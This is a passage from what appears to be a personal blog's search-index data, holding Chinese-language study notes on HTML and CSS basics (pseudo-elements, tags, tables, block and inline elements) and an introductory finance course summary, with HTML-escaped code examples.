&lt;li&gt;内容5&lt;/li&gt;&lt;/ul&gt;&lt;!--!!!!!注意：从最后一个指出的兄弟开始生效，到第一个不同的兄弟终止。--&gt;&lt;/body&gt;&lt;/html&gt; 3.5.3 CSS伪元素CSS引入伪类和伪元素概念为了格式化文档树以外的信息。也就是说，伪类和伪元素是用来修饰不在文档树中的部分。 1）二者区别： 伪类用于当已有元素处于的某个状态时，为其添加对应的样式，这个状态是根据用户行为而动态变化的。他只有处于dom树无法描述的状态下才能为元素添加样式，所以称之为伪类。 伪元素用于创建一些不在文档树中的元素，并为其添加样式，这个状态是根据用户行为而动态变化的。比如，我们可以通过:before来在一个元素前增加一些文本，并为这些文本添加样式。虽然用户可以看到这些文本，但是这些文本实际上不在文档树中。 2）伪类&amp;伪元素的特点： 伪元素和伪类都不会出现在源文档或者文档树中，鼠标无法选中。 伪类允许出现在选择器的任何位置，而一个伪元素只能跟在选择器的最后一个简单选择器后面。 伪元素名和伪类名都是大小写不敏感的。 有一些伪类的互斥的，而其他的可以同时用在同一元素上（在规则冲突的情况下，常规层叠顺序决定结果）。 3）:before/:after/:first-letter/:first-line：前面可以是1个冒号，也可以是2个冒号。 4）::selection/::placeholder/::backdrop：前面只能是双冒号。 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS伪元素&lt;/title&gt; &lt;style&gt; p:first-letter&#123; font: 30px 宋体; color: #8080ff; &#125; p:first-line&#123; text-decoration: underline blue; &#125; p:before&#123; content: &#x27;☯&#x27;; &#125; p:after&#123; content: &#x27;……&#x27;; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;与八代产品线相比（如 8750H），我们发现 9750H 与 9850H 之间的差距已经变得更小， 这或许也是它被大多数游戏笔记本所采纳的原因。 或许是感受到了大家对于“挤牙膏”的怨念，英特尔决定至少专门推出一款有实质性提升的 9 代笔记本标压处理器。 现在看来，9750H 也是唯一获得了 10~20% 频率提升的芯片。 &lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 第二次作业12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364h1&#123; text-align: center; font-family: 宋体,微软雅黑; margin: 10px 0 20px;/*上边距20，左右边距0，下边距10*/ font-size: 30px; font-weight: normal;&#125;body&#123; background-image: url(&quot;https://s3.ax1x.com/2021/03/16/6s31gg.png&quot;); background-repeat: repeat-y; background-position: 0 0; background-attachment: scroll; padding: 10px 0;&#125;#author&#123; text-align: center; font-weight: bolder;&#125;a&#123; text-decoration: none;&#125;#my_site:link&#123; color: #8080ff;&#125;#my_site:visited&#123; color: rgb(225, 230, 200);&#125;#my_site:hover&#123; color: #87faf8;&#125;#my_site:active&#123; color: rgb(255, 255, 0);&#125;.content&#123; color: orchid; text-align: left; text-indent: 2em; font-size: 30px; margin: 1.5em 0; line-height: 1.5em;&#125;h1+p+p&#123; font-size: 5px; border-top: 1px solid #010101; border-bottom: 1px solid #010101; padding: 30px 0; text-indent: 0; color: dodgerblue;&#125;.main&#123; border: 1px solid #87faf8; padding: 20px; margin: 0 auto; width: 800px;&#125;.summary&#123; color: red;&#125;ul&#123; color: gray; list-style-type: none;/*取消列表前的point*/ text-indent: 2em; line-height: 2em;&#125; 1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;第三次作业&lt;/title&gt; &lt;link rel=&quot;shortcut icon&quot; href=&quot;https://s3.ax1x.com/2021/03/16/6s31gg.png&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./CSS/第三次作业.css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;main&quot;&gt; &lt;h1&gt;3·15晚会已播30年 那些曾被点名的企业过得如何？&lt;/h1&gt; &lt;p id=&quot;author&quot;&gt;&lt;a id=&quot;my_site&quot; href=&quot;https://miketaylorjuly123.cn&quot; title=&quot;作者&quot; target=&quot;_blank&quot;&gt;张加林&lt;/a&gt;&lt;/p&gt; &lt;p id=&quot;abstract&quot;&gt;&lt;span class=&quot;summary&quot;&gt;摘要&lt;/span&gt;：奇奇怪怪，古古怪怪，嘻嘻哈哈，吞吞吐吐&lt;/p&gt; &lt;p class=&quot;content&quot;&gt;盘点近10年来3·15晚会的“上榜”企业名单，作为一场维护普通消费者权益的公益晚会，3·15晚会所关注的领域，很多都与“衣食住行”相关。 从数量来看，“衣食住行“这四个方面的企业和问题几乎就占据了3·15晚会“名单”的半壁江山。 辣条生产乱象、山寨“六个核桃”、“化妆”鸡蛋等食品相关问题；H&amp;M、ZARA、ARMANI等服装品牌抽检不合格；方太、美的、西门子等家用电器售后服务的“套路”…… 作为中国最大的毛巾生产基地，河北省高阳县的一些厂家生产的毛巾无法保证检测合格 在我国主要海参养殖区域之一山东即墨，养殖户为了清除不利于海参生长的其他生物，往池塘里加入了不少敌敌畏；此外，快餐企业汉堡王也被爆出售食品中包含过期食材 在广州市黄埔开发区，万科旗下的“精装修”房万科尚城被称为“惊装修”：存在卫生间、插座漏水的状况，甚至渗透出来的是排粪水 上汽通用五菱旗下的“神车”宝骏560，被爆出变速箱故障：在高速路上会突然失去动力，维修后仍故障不断，更换变速箱后一个月内挂倒挡动力又失效&lt;/p&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;你可能感兴趣相关内容1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;你可能感兴趣相关内容2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;你可能感兴趣相关内容3&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;你可能感兴趣相关内容4&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 开发思路：整体到局部，自上而下 选中标签中的所有内容快捷键：ctrl+Alt+T section(区块标签) display:block 导读标题到页内具体位置的操作 1234&lt;a href=&quot;#title1&quot;&gt;&lt;/a&gt; &lt;!--导读标题--&gt;&lt;!--href表示锚点，实现页内跳转--&gt;&lt;a name=&quot;title1&quot;&gt;&lt;/a&gt; &lt;!--跳转处--&gt;&lt;!--这里的a标签是一个锚点--&gt;","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/CSS/"}]},{"title":"简历学习","slug":"简历书写学习","date":"2021-03-10T11:45:32.000Z","updated":"2021-11-22T07:44:07.144Z","comments":true,"path":"2021/03/10/简历书写学习/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/03/10/%E7%AE%80%E5%8E%86%E4%B9%A6%E5%86%99%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"","categories":[],"tags":[{"name":"面试","slug":"面试","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"金融 第一周","slug":"金融学基础1","date":"2021-03-10T11:45:32.000Z","updated":"2021-03-12T12:20:22.588Z","comments":true,"path":"2021/03/10/金融学基础1/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/03/10/%E9%87%91%E8%9E%8D%E5%AD%A6%E5%9F%BA%E7%A1%801/","excerpt":"","text":"金融的概念与含义货币：为了促进交易或价值交换而出现，而度量商品价值是货币的首要职能。 商品的价值正是商品可以给人们带来的效用、给企业带来的收益的一种度量。 货币可以将未来的一系列效用在“当前”、在“现在”体现和实现，从而“钱”具有变现的功能，进而价值度量和促进交易。 住房按揭贷款、消费贷款等帮助人们更好地平滑现在和将来之间的消费。 企业贷款帮助企业在现在和将来之间更好地进行资源配置。 风险意味着回报！ 作为经济学的一门分支学科，金融学是研究人们如何在不确定环境下跨时期时间进行稀缺时间进行稀缺资源配置的一门学问。 “钱” 资金的流动 风险的配置 信息的揭示 ······ 金融学三大支柱： 跨时期优化 风险管理 资产估值 个人/家庭和企业的金融决策个人/家庭金融决策： 消费和储蓄决策 投资决策：如何花钱或现金流出的决策 融资决策：如何筹钱或现金流入决策 风险管理决策：如社保、医保等 企业的金融决策： 战略规划 资本预算/投资决策 企业如何花钱 资本结构/融资决策 融资金额大小与融资方式选择（股票 VS 债券） 不同的融资方式或资本结构意味着投资者不同（包括债券人）对公司利润分配、资产处置、重大决策投票权等具有不同的权力和权利。 营运资本管理决策 流动资产 流动负债 净营运资本=流动资产-流动负债 股利决策 债券人：优先获得利息或到期本金 股东：剩余索偿权 风险管理决策 面临的不确定因素：投资项目失败、生产成本增加、进出口企业、资金成本过高 资金的流动与金融系统 金融系统：通过一系列的金融资产/合约交易（包括风险的交易），帮助家庭/个人、企业或政府执行各种金融决策的系统。通常包括： 金融市场（交易所场所、场外市场······） 金融中介（商业银行、投资银行······） 服务公司（信用评级公司、投资咨询公司······） 其他机构（监管部门、非盈利机构······） 直接的资金流动 通过“金融中介”的资金流动 通过“金融市场”的资金流动 先通过“金融中介”，再通过“金融市场”的资金流动 先通过“金融市场”，再通过“金融中介”的资金流动 金融系统再定义：通过各种形式的金融产品/服务的提供，由金融市场和金融中介构成的金融系统使得交易参与者无法直接进行或有效进行的交易成为可能，进而更好地满足了人们（时间和风险两个维度上）的偏好需求。 降低（边际交易成本） 扩大交易/服务范围等 金融市场的类型金融市场的交易组织形式 交易所：在集中、固定的交易大厅内进行金融交易的场所。 纽约交易所 NYSE 上海交易所 SHSE 深圳交易所 SZSE 中国金融期货交易所 CFFE 场外市场（OTC）：又被称为“柜台/店头市场”，是分散在各个金融机构柜台的市场，无集中交易场所，通常也无统一的交易制度。 纳斯达克股票交易市场 NASDAQ LIBOR SHIBOR 互换/掉期市场 Swaps 金融市场产品类型 金融市场衍生产品 衍生品价格高度依赖于股票、债券等基础资产的价格及其波动。 概念解释–优先股： 所谓”优先“，主要是指该类股东在利润分配和剩余索偿方面优先于普通股股东。 股利支付比例预先设定（类似于债务利息） 其他权利范围通常较小：一般没有选举权和被选举权，对公司的重大经营无投票权（在某些情况下才享有投票权、有限表决权等。） 金融市场产品期限 金融创新与金融系统的功能金融变迁（略） 金融和金融系统演变和变化的原因：金融创新就像一只“无形的手”，促进了金融系统的不断演变，导致了金融产品及服务形式的不断改变，以最终满足人们“时间”和“风险”两个维度上的偏好需求。 金融创新的动力： 人们偏好需求的变化 金融中介和金融市场上的竞争 通信、信息技术等的不断进步 金融系统的六大功能： 清算和结算支付 跨时间和空间转移资源 风险管理 风险分散 风险对冲 期权/保险 集合资源和分割股份 提供信息 金融系统中，资产的价格是买卖交易或者供需共同作用的结果，而每一笔交易（或决策）反映了交易者（或决策者）所拥有、收集和分析处理后的信息，因此，可以同通过分析交易行为及资产价格表现等推断资产背后的信息。 处理激励问题 激励问题：交易（或签定合同）的双方由于信息不对称而导致的有损信息劣势方利益，进而有损市场交易的两种经济行为。 事后隐藏行动–道德风险： 道德风险例子： 投了火灾保险的人就不关心是否失火，甚至故意纵火骗保。 上市公司擅自变更募集资金的用途 解决方法： 保险/贷款条约设计 募集资金使用的系列监管办法 风险投资的分阶段投资 事前隐藏类型–逆向选择 逆向选择例子： 二手车市场 中小企业融资难问题 解决方法： 信号传递与甄别 就业过程中“证书”和学校的“牌子” 抵押/担保贷款 上市之前的路演 金融学科体系","categories":[],"tags":[{"name":"金融","slug":"金融","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E9%87%91%E8%9E%8D/"}]},{"title":"前端HTML/CSS","slug":"HTML_CSS知识点","date":"2021-03-07T11:29:45.000Z","updated":"2021-09-12T04:07:34.191Z","comments":true,"path":"2021/03/07/HTML_CSS知识点/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/03/07/HTML_CSS%E7%9F%A5%E8%AF%86%E7%82%B9/","excerpt":"前端入门HTML/CSS 详细文档","text":"网课学习链接：https://www.bilibili.com/video/BV1i7411Z7d8?from=search&amp;seid=8366974428184480871 前言 互联网产品 前端开发 页面、功能开发 岗位 CEO：产品意向决策 产品经理：需求分析、产品原型图 后端工程师：数据库设计、业务功能开发 UI设计师：UI图（PS） 前端工程师：UI图 =&gt; 静态页面、动画效果 测试工程师：测试报告 运维工程师：产品上线、运维、推广 架构师：软件项目总设计师 前端开发需要的技术 PS：切图，注意图片大小 HTML\\HTML5：网页布局 CSS\\CSS3：页面美化 布局知识：PS+HTML/HTML5+CSS/CSS3 Bootstrap：UI框架、开发多个平台使用 Javascript：逻辑（难点） jQuery：JS的封装，用JS开发为原生开发、用jQuery简化开发 Ajax：基于jQuery的封装、做页部请求（登陆流程） 模块开发、组件化开发框架 学会使用Typora支持多种导出格式word、pdf、图片、markdown、Picogo图片自动上传服务 插图片：ctrl+shift+I 第一章 HTML1.1 认识HTML1.1.1 HTML概述HTML：超文本标记语言，一种标识性语言，非编程语言，不能进行逻辑运算。通过标签将网络上的文档格式进行统一，使得分散的网络资源连接为一个逻辑整体。 **超文本**：一种组织信息的方法，通过超级链接将多种媒介关联起来。 **标记**：标签，用&lt;&gt;包裹的具有一定含义的内容，比如： &lt;?&gt;---&lt;/?&gt; 1.1.2 HTML功能1.展示在线文档，包含标题、文本、表格、列表、图片、视频。 2.超链接检索在线信息 3.为远程服务而设计表单，可用于检索信息、订购产品。 4.文档直接包含电子表格、视频剪辑、声音剪辑以及一些其他的应用。 1.1.3 HTML历次版本（略）1.1.4 HTML与互联网（略）1.1.5 动态网页与静态网页静态网页：HTML代码、内容完成后，页面内容和显示效果就基本不会变化，除非修改网页源代码 动态网页：页面代码虽然没变，但是显示内容可以随着时间、环境或者数据库操作的结果变化而改变。 注意：不要将动态网页理解为页面有动画效果。 ​ 反例：网页幻灯片效果、文字滚动效果，如果内容没有变化，那么也是静态网页。 1.1.6 浏览器概念概念：解释和执行HTML源码的工具。 主流Explore：IE、Chrome、Opera、FireFox、Safari 1.1.7 浏览器内核——引擎装置渲染引擎+JS引擎 Trident：IE内核，微软 Gecko：FireFox WebKit：用于Mac OS Blink：Chrome、Opera 1.2 HTML文档结构123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;!--表示声明的意思，声明下面的文档标签将以html5规范去解析--&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;!--汉字编码--&gt;&lt;!--meta:源，主要用来完成对应设置--&gt; &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;&lt;!--设置一个网站的搜索关键词--&gt; &lt;title&gt;前端之旅&lt;/title&gt;&lt;!-- 网站的内容描述--&gt; &lt;link rel=&quot;shortcut icon&quot; href=&quot;https://s3.ax1x.com/2021/03/08/6lSgHK.jpg&quot; type=&quot;image/jpg&quot;&gt; &lt;style&gt; /*--书写样式*/ &lt;/style&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;&lt;!--用来引入外部样式文件--&gt;&lt;/head&gt;&lt;body&gt;&lt;!--主体部分，文档区域--&gt;&lt;p&gt;这是一个段落&lt;/p&gt;&lt;/body&gt;&lt;script&gt;&lt;!--放脚本代码--&gt;&lt;/script&gt;&lt;/html&gt; 快捷创建模板： 1！`+`Tab` /`html:5`+`Tab 快捷复制：Ctrl+D/Ctrl+鼠标右键 快捷注释：Ctrl+Shift+//Ctrl+/ 1.2.1 基本标签12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--div：用来布局，没有具体含义--&gt; &lt;div&gt; abc &lt;div&gt; def &lt;/div&gt; &lt;/div&gt; &lt;!--hx:标题，从1级到6级，1大6小，会自动加粗，有默认字号--&gt; &lt;h1&gt; 前端开发 &lt;/h1&gt; &lt;h2&gt; Java &lt;/h2&gt; &lt;h6&gt; 大前端开发 &lt;/h6&gt; &lt;!--p:表示段落，相当于一个ENTER--&gt; &lt;p&gt;在学习英语时所说的国际音标是指应用于英语的国际音标，我们也称它为英语国际英语。48个国际音标表也被称作48个音标表、48个英语音标表&lt;/p&gt; 在学习英语时所说的国际音标是指应用于英语的国际音标，我们也称它为英语国际英语。 48个国际音标表也被称作48个音标表、48个英语音标表 &lt;!--br:换行符号，为单标签--&gt; &lt;p&gt;在学习英语时所说的国际音标是指应用于英语的国际音标，我们也称它为英语国际英语。 &lt;br&gt;48个国际音标表也被称作48个音标表、&lt;br/&gt; 48个英语音标表&lt;/p&gt; &lt;!--hr:生成一条水平线，起分隔装饰作用,为单标签--&gt; &lt;hr/&gt; &lt;hr width=&quot;80%&quot; align=&quot;right&quot; color=&quot;red&quot; height=&quot;1000px&quot;/&gt; &lt;!--设置超文本链接--&gt; &lt;a href=&quot;https://miketaylorjuly123.cn&quot; title=&quot;博客&quot; target=&quot;_blank&quot;&gt;个人小站&lt;/a&gt; &lt;!--_blank：浏览器总是在新打开、未命名的窗口载入目标文档--&gt; &lt;a href=&quot;https://miketaylorjuly123.cn&quot; title=&quot;博客&quot; target=&quot;_self&quot;&gt;个人小站&lt;/a&gt; &lt;!--_self：浏览器总是在当前窗口载入目标文档--&gt; &lt;!--target其他值：_parent/_top--&gt; &lt;!--img:图片用来加载外部图像，src属性：用来设置加载图片或图像的路径--&gt; &lt;!--alt属性：当图片或图像加载不成功时，将显示其内容，否则将不会显示--&gt; &lt;img src=&quot;https://s3.ax1x.com/2021/03/08/6lSgHK.jpg&quot; alt=&quot;美图&quot; title=&quot;爱情&quot; width=&quot;40%&quot;&gt; &lt;!--span：作用与div，都用来布局，不同的是&lt;div&gt;会单独占据一行，而&lt;span&gt;不会--&gt; &lt;!--span:用于行列布局--&gt; &lt;div&gt;div1&lt;/div&gt; &lt;div&gt;div2&lt;/div&gt; &lt;span&gt;span1&lt;/span&gt; &lt;span&gt;span2&lt;/span&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;!--ul/ol列表：前者是无序列表，后者是有序列表，它们的列表内容都用的是li标签--&gt; &lt;!--ul&gt;li&#123;li$&#125;*3+tab--&gt; &lt;ul&gt; &lt;li&gt;li1&lt;/li&gt; &lt;li&gt;li2&lt;/li&gt; &lt;li&gt;li3&lt;/li&gt; &lt;/ul&gt; &lt;!--快捷键：ctrl+D--&gt; &lt;ol&gt; &lt;li&gt;li1&lt;/li&gt; &lt;li&gt;li2&lt;/li&gt; &lt;li&gt;li3&lt;/li&gt; &lt;/ol&gt; &lt;!--注释方式：浏览器不会解析注释--&gt;&lt;/body&gt;&lt;/html&gt; 1.2.2 标签属性123456789101112131415161718&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;标题属性&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--标签属性： 1.通常由属性名=”属性值“组成 2.起附加说明信息作用 3.不是所有属性都有属性，如&lt;br/&gt; --&gt; &lt;p title=&quot;段落&quot; class=&quot;content&quot; id=&quot;content&quot;&gt;这是一个测试段落&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 1.2.3 文本格式化标签12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!--文本格式化标签--&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--文本格式化标签：通过标签美化文本外观--&gt; &lt;!--b/strong：都有加粗作用，都是行级标签（不会自动换行）。但strong除此之外还有强调作用。 注释：主要用于SEO优化时，便于提取关键字--&gt; &lt;b&gt;加粗&lt;/b&gt; &lt;br/&gt; &lt;strong&gt;加粗且强调&lt;/strong&gt;&lt;br/&gt; &lt;!--和em：使文字倾斜，为行级标签，em附加强调作用，简单倾斜，使用i标签即可，比如添加图标等--&gt; &lt;i&gt;倾斜&lt;/i&gt; &lt;em&gt;倾斜且强调&lt;/em&gt; &lt;!--pre：预格式化文本，通常会保留空格和换行符以及宽度，文字字号会较小 为块级标签，在浏览器中会独占一行--&gt; &lt;pre&gt;预格式 化文本 通常会保留空格 和换行符以及 宽度 &lt;/pre&gt; &lt;!--small/big：分别让文字缩小或放大一号，行级标签（不会占行，不识别宽高） big：被淘汰，但未被删除，后期开发尽量不要使用淘汰标签 浏览器支持的最小字号为12px号，若要显示比12px号还小的文字效果，需要进行处理 small还可以用来加载图片--&gt; &lt;small&gt; 小号 &lt;/small&gt; &lt;p&gt;正常&lt;/p&gt; &lt;big&gt; 大号 &lt;/big&gt;&lt;br&gt; &lt;!--sub/sup：设置文本为下标和上标，用来调整文本正常显示的基线，且文字会自动小一号--&gt; &lt;p&gt;X&lt;sub&gt;1&lt;/sub&gt; +Y&lt;sub&gt;2&lt;/sub&gt;=Z&lt;sub&gt;1&lt;/sub&gt;&lt;/p&gt; &lt;p&gt;X&lt;sup&gt;2&lt;/sup&gt;+Y&lt;sup&gt;6&lt;/sup&gt;=Z&lt;sup&gt;2&lt;/sup&gt; &lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 1.2.4 HTML单双标记的区别单标记：由一个标签组成。比如： &lt;br/&gt;:换行符 &lt;hr/&gt;：水平线&lt;img/&gt;：图片标签&lt;link/&gt;：文本标签 ：元信息标签 双标签：由开始标签和结束标签两部分构成，必须成对使用。例：略 1.2.5 HTML实体字符转义 实体字符 编译后的字符 &lt; 小于号（&lt;） &gt; 大于号（&gt;） 空格 &amp; 与号（&amp;） © 版权号（©） × 乘号（X） ÷ 除号（÷） 1.2.6 HTML块级元素和行内元素及相互转化1234567891011121314151617181920212223242526272829303132333435363738&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--块级元素（相当于执行了display:block操作）： 1.独占一行 2.宽高可控，若没有设置其宽度，将默认铺满整行 3.块级元素内可以包含块级和行级元素 --&gt;&lt;!--行级元素（相当于执行了display:inline操作）： 1.不会独占一行，与相邻行级元素占同一行，直到行占满为止，占满后会自动到下一行 2.宽高不可控 3.只能包含行级元素 --&gt; &lt;div&gt;div&lt;/div&gt; &lt;div style=&quot;width: 300px;height: 50px;background: gray&quot;&gt;div&lt;/div&gt; &lt;p&gt;p&lt;/p&gt; &lt;p style=&quot;width: 300px;height: 50px;background: gray&quot;&gt;p&lt;/p&gt; &lt;strong style=&quot;width: 300px;height: 50px;background: gray&quot;&gt;strong&lt;/strong&gt; &lt;span style=&quot;width: 300px;height: 50px;background: gray&quot;&gt;span&lt;/span&gt; &lt;!--可以发现后两个的宽高没有变化--&gt; &lt;!--1.块级标签转化为行级标签（display:inline）--&gt; &lt;span style=&quot;width: 300px;height: 50px;background: gray;display: inline;&quot;&gt;块级标签转行级标签&lt;/span&gt; &lt;!--使得块级标签宽高失效--&gt; &lt;!--2.行级标签转化为块级标签--&gt; &lt;span style=&quot;width: 300px;height: 50px;background:lightgreen;display:block;&quot;&gt;行级标签转块级标签&lt;/span&gt;&lt;/body&gt;&lt;/html&gt; W3C：万维网联盟W3C标准由由结构、表现、行为三部分组成 嵌套规则： 块级元素可以包含行级元素、但行级元素不能包含块级元素 块级元素不能放在p标签内 12&lt;p&gt;&lt;ol&gt;&lt;li&gt;&lt;li&gt;&lt;ol&gt;&lt;/p&gt; ❌&lt;p&gt;&lt;div&gt;&lt;/div&gt;&lt;/p&gt; ❌ 下列特殊块级元素只能包含行级元素，不能包含块级元素。 特殊元素 h1 h2 h3 h4 h5 h6 p dt 块级元素与块级元素、内嵌元素与内嵌元素并列。 1&lt;div&gt;&lt;h2&gt;&lt;/h2&gt;&lt;span&gt;&lt;/span&gt;&lt;div&gt; ❌ 1.2.7 HTML语义化标签语义化：明白每个标签的用途 使用的好处： 更容易被搜索引擎收录 更容易让屏幕阅读器读出网页内容 能够更好的体现页面的主题 兼容性更好，支持更多的网络设备 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;语义化标签&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--点击图片跳转超链接--&gt; &lt;!--title属性：当鼠标滑过链接文字时会显示这个属性的文本内容 可以方便了解链接的内容 --&gt; &lt;a href=&quot;https://miketaylorjuly123.cn&quot; title=&quot;爱情&quot;&gt; &lt;img src=&quot;https://s3.ax1x.com/2021/03/08/6lSgHK.jpg&quot; alt=&quot;图片&quot; width=&quot;99%&quot;&gt; &lt;/a&gt; &lt;!--q标签：短文本引用--&gt; &lt;q&gt;雨过天晴云破处&lt;/q&gt; &lt;!--address：为网页加入地址信息--&gt; &lt;address&gt; &lt;p&gt;电话：211212054&lt;/p&gt; &lt;p&gt;家庭住址：XXXXXXXXX&lt;/p&gt; &lt;/address&gt; &lt;!--caption：为表格添加标题和摘要--&gt; &lt;table border=&quot;1&quot;&gt; &lt;caption&gt;学生信息表&lt;/caption&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;th&gt;学号&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;对我说&lt;/th&gt; &lt;th&gt;12&lt;/th&gt; &lt;th&gt;321&lt;/th&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 1.2.8 企业官网文件命名规范项目开发时，文件中项目或目录名中不能出现汉字和空格之类的其他符号，文件和目录名一般以 字母/下划线_开头,其后可以出现字母，下划线。 页面 命名规范 首页 index.html 公司介绍 about.html 新闻列表 news.html 新闻详情页 about.html 产品列表 product.html 产品详情页 pro_details.html 联系我们 contact.html 课程提要 HTML标签属性 table表格标签 form表格标签 iframe框架标签 1.2.9 HTML标签通用属性 标签组成：标签名、标签属性、文本内容三部分组成（单标签没有文本内容） 标签属性是对标签的一种描述方式 标签属性分为：通用属性、自有属性、用户自定义属性 通用属性：所有标签都有的属性，包括： id：ip属性，用于给标签取唯一的名称，在一个网页内是唯一的 class：用于给标签取类名，用于标签批量操作 style：用于设置标签的行列样式 title：当鼠标移到该标签上时所显示的提示内容 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;标签通用属性&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--id：取一个标签起一个标识名--&gt; &lt;!--具有唯一性--&gt; &lt;p id=&quot;p1&quot;&gt;段落一&lt;/p&gt; &lt;p id=&quot;p2&quot;&gt;段落二&lt;/p&gt; &lt;!--class：给一组标签起一个类名--&gt; &lt;div class=&quot;box&quot; &gt;div&lt;/div&gt; &lt;p class=&quot;box&quot;&gt;&lt;/p&gt; &lt;!--用来设置当前标签的样式，只能在当前标签内有效,也叫行列样式--&gt; &lt;p style=&quot;color: red;width: 200px;border :1px solid #00f;&quot;&gt;这是一次测试&lt;/p&gt; &lt;!--title：给当前标签一个提示文本--&gt; &lt;p title=&quot;测试&quot;&gt;title属性测试&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 1.2.10 标签自定义属性通常用于传值或用于图片懒加载等方面。 格式：data-* 12&lt;img data-src=&quot;图片名&quot; alt=&quot;提示文本&quot;/&gt;&lt;p data-id=&quot;goodsid&quot;&gt;---&lt;/p&gt; 1.3 table表格主要用于呈现格式化数据。表格由行、列组成。 表格属性 width：设置表格边框，默认单位均为像素 align：设置表格对齐 cellpadding：设置单元格间距，默认单位均为像素 cellspacing：设置像素间隔，默认单位均为像素 border：表格边框 1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;table表格&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- table&gt;tr*3&gt;td&#123;内容$&#125;*3 --&gt; &lt;table border=&quot;1&quot; width=&quot;400&quot; cellpadding=&quot;1&quot; cellspacing=&quot;1&quot; align=&quot;center&quot;&gt; &lt;tr&gt; &lt;!--th：表头，说明作用，th内容自动加粗居中--&gt; &lt;th&gt;属性1&lt;/th&gt; &lt;th&gt;属性2&lt;/th&gt; &lt;th&gt;属性3&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;内容1&lt;/td&gt; &lt;td&gt;内容2&lt;/td&gt; &lt;td&gt;内容3&lt;/td&gt; 